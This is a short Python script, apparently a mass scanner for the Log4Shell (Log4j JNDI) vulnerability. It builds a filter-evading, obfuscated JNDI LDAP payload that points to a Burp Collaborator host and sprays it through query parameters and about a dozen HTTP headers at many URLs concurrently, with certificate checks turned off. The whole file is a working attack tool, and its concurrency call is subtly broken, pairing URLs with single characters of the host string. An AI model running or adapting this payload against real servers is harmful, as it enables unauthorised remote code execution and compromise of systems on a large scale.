import requests
import concurrent.futures


def open_file(file):
    with open(file, "r") as f:
        text = f.readlines()
        return text


def send_payload(url, burp_colab_string):
    payload = f"${{${{env:BARFOO:-j}}ndi${{env:BARFOO:-:}}${{env:BARFOO:-l}}dap${{env:BARFOO:-:}}//{burp_colab_string}/a}}"
    params = {"id": payload, "keywords": payload}
    headers = {
        "User-Agent": payload,
        "Referer": payload,
        "CF-Connecting_IP": payload,
        "True-Client-IP": payload,
        "Originating-IP": payload,
        "Forwarded": payload,
        "Client-IP": payload,
        "Contact": payload,
        "From": payload,
        "X-Forwarded-For": payload,
        "X-Wap-Profile": payload,
        "X-Client-IP": payload,
        "X-Real-IP": payload,
    }
    stripped_url = url.strip()
    print(stripped_url)
    requests.get(url, headers=headers, params=params, verify=False, timeout=10)


def payload_sender(urls, burp_colab_string):
    try:
        with concurrent.futures.ThreadPoolExecutor() as executor:
            executor.map(send_payload, urls, burp_colab_string)
    except:
        print("SOMETHING WENT WRONG (proper error handling not implemented yet).")
